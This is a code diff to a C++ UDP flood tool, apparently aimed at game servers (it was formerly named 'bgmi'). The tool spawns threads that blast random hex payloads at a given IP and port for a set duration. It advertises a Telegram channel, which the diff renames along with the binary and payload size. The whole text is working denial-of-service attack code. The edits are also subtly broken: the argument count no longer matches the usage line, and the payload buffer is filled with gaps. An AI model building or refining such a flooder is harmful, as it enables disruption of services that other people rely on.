@@ -14,7 +14,7 @@
     #include <unistd.h>
 #endif
 
-#define PAYLOAD_SIZE 25
+#define PAYLOAD_SIZE 30
 class Attack {
 public:
     Attack(const std::string& ip, int port, int duration)
@@ -22,12 +22,12 @@ public:
 
     void generate_payload(char *buffer, size_t size) {
         for (size_t i = 0; i < size; i++) {
-            buffer[i * 4] = '\\';
-            buffer[i * 4 + 1] = 'x';
-            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
-            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
+            buffer[i * 5] = '\\';
+            buffer[i * 5 + 1] = 'x';
+            buffer[i * 5 + 2] = "0123456789abcdef"[rand() % 16];
+            buffer[i * 5 + 3] = "0123456789abcdef"[rand() % 16];
         }
-        buffer[size * 4] = '\0';
+        buffer[size * 5] = '\0';
     }
 
     void attack_thread() {
@@ -35,7 +35,7 @@ public:
         struct sockaddr_in server_addr;
         time_t endtime;
         
-        char payload[PAYLOAD_SIZE * 5 + 1];
+        char payload[PAYLOAD_SIZE * 8 + 1];
         generate_payload(payload, PAYLOAD_SIZE);
 
         if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
@@ -73,12 +73,12 @@ void handle_sigint(int sig) {
 }
 
 void usage() {
-    std::cout << "Usage: ./bgmi ip port duration threads\n";
+    std::cout << "Usage: ./ravi {ip}  {port}  {duration}  {threads}\n";
     exit(1);
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 5) {
+    if (argc != 6) {
         usage();
     }
 
@@ -112,7 +112,7 @@ int main(int argc, char *argv[]) {
         pthread_join(thread_ids[i], NULL);
     }
 
-    std::cout << "Attack finished. Join @R_SDANGER77\n";
+    std::cout << "Attack finished. Join @SOULCRACKS\n";
     return 0;
 }
-//g++ -std=c++14 soulcracks.cpp -o soul -pthread
+//g++ -std=c++14 cracks.cpp -o soul -pthread
